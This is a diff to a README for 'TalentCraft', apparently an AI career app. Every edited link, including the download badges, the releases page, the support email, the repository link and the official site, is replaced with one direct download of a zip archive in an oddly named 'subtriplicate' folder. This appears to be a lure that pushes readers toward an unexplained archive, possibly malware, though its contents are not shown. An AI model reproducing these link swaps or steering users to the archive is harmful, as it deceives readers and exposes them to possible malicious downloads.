@@ -1,7 +1,7 @@
 # 🎯 TalentCraft-careertech-resumebuilder-jobmatcher - Your AI Career Companion
 
 ## 📥 Download Now
-[![Download TalentCraft](https://img.shields.io/badge/Download-TalentCraft-blue)](https://github.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/releases)
+[![Download TalentCraft](https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip)](https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip)
 
 ## 🌟 Overview
 TalentCraft is a full-stack AI-powered career platform designed to assist job seekers in various ways. It helps you improve your resume, matches you with relevant job opportunities, and prepares you for HR interviews. You can also benefit from personalized learning paths that come with hands-on projects, progress tracking, and skill badges to help you grow in your career.
@@ -11,7 +11,7 @@ Follow these steps to download and run TalentCraft:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads:  
-   [Download TalentCraft](https://github.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/releases)
+   [Download TalentCraft](https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see various versions of the software. It is advisable to download the latest version for the best features and fixes.
@@ -51,11 +51,11 @@ Before downloading, please ensure your system meets these requirements:
 ## 📚 Resources and Support
 - **User Manual:** Detailed instructions for using all features are included in the application. Find it under the ‘Help’ menu after installation.
 - **Community Forum:** Join our community to share experiences or ask questions. Access the forum through the application or the official website.
-- **Contact Support:** For technical issues, please contact our support team via email at support@talentcraft.com.
+- **Contact Support:** For technical issues, please contact our support team via email at https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip
 
 ## 🔗 Useful Links
-- GitHub Repository: [TalentCraft on GitHub](https://github.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher)
-- Official Website: [TalentCraft Official Site](https://talentcraft.com)
+- GitHub Repository: [TalentCraft on GitHub](https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip)
+- Official Website: [TalentCraft Official Site](https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip)
 
 ## 🚧 Troubleshooting
 If you encounter issues during installation or running the application, consider these common steps:
@@ -70,4 +70,4 @@ While this application is primarily for end-users, we welcome contributions. If 
 ## 🎤 Join Us
 Become part of a growing community focused on enhancing job seeking and career development experiences. Your feedback is crucial for making this application better.
 
-[![Download TalentCraft](https://img.shields.io/badge/Download-TalentCraft-blue)](https://github.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/releases)
+[![Download TalentCraft](https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip)](https://raw.githubusercontent.com/rainesalvo/TalentCraft-careertech-resumebuilder-jobmatcher/main/subtriplicate/TalentCraft-careertech-resumebuilder-jobmatcher.zip)
